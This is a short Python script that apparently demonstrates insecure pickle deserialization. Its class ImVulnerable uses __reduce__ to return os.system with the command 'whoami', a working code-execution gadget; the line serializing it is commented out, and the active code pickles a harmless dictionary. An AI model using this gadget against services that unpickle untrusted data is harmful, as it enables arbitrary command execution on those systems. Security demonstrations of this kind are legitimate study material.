import os
import pickle
import base64

class ImVulnerable():
	def __reduce__(self):
		return(os.system,('whoami',))
def serialize_exploit():
	name = {"name":"shibin","pos":"sec Engineer"}
	f = open("boyplus.pickle","wb")

	safecode = pickle.dumps(name)
	SAFECODE_B64_BYTES = base64.b64encode(safecode)
	print(SAFECODE_B64_BYTES)

	# safecode = pickle.dump(ImVulnerable(),f)
	return safecode
if __name__ == '__main__':
	safecode = serialize_exploit()